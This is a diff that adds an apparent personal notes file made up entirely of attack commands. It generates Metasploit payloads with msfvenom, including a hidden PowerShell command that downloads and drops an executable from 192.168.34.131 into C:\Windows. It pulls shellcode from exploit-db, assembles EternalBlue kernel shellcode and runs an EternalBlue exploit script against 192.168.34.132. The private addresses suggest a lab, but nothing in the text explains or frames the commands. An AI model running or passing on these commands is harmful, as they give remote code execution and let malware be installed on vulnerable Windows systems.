@@ -1,0 +1,26 @@
+msfvenom -p windows/x64/exec cmd="powershell -ExecutionPolicy bypass -noprofile -windowstyle hidden (new-object system.net.webclient).downloadfile('http://192.168.34.131/1.exe','C:\Windows\23.exe');start-process " exitfunc=thread -f raw -o shell_msf.bin
+
+powershell IEX ((new-object net.webclient).downloadfile('http://192.168.34.131/1.exe','C:\Windows\23.exe'))
+
+
+
+msfvenom -p windows/x64/exec cmd="calc" exitfunc=thread -f raw -o shell_msf.bin
+
+
+
+
+
+
+searchsploit download
+ cp /usr/share/exploitdb/shellcodes/windows_x86-64/13533.asm shellcode/
+
+
+msfvenom -p windows/exec cmd="calc" exitfunc=thread -f raw -o shell_msf.bin
+
+nasm -f bin eternalblue_kshellcode_x64.asm
+
+cat eternalblue_kshellcode_x64 shell_msf.bin > shell_code.bin
+
+python eternalblue_exploit7.py 192.168.34.132 shellcode/shell_code.bin
+
+
